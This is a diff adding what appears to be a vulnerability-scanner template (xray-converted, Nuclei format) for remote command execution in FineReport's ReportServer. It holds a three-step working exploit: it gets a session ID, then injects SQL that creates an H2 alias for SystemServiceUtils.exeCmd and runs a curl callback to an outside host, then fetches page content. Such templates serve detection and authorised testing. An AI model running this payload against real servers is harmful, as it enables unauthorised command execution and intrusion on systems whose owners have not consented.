@@ -1,0 +1,48 @@
+id: poc-yaml-finereport-fr-log-rce
+
+info:
+  name: poc-yaml-finereport-fr-log-rce
+  author: chaitin
+  severity: medium
+  tags: xray-converted,rce
+  reference:
+    - https://xz.aliyun.com/t/11064
+
+http:
+  - raw:
+      - |
+        GET /WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sessionID"
+  - raw:
+      - |
+        POST /WebReport/ReportServer?op=fr_dialog&cmd=parameters_d&sessionID={{sessionID}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        __parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl {{reverseURL}}');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /WebReport/ReportServer?_={{nowtime}}585&__boxModel__=true&op=page_content&sessionID={{sessionID}}&pn=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
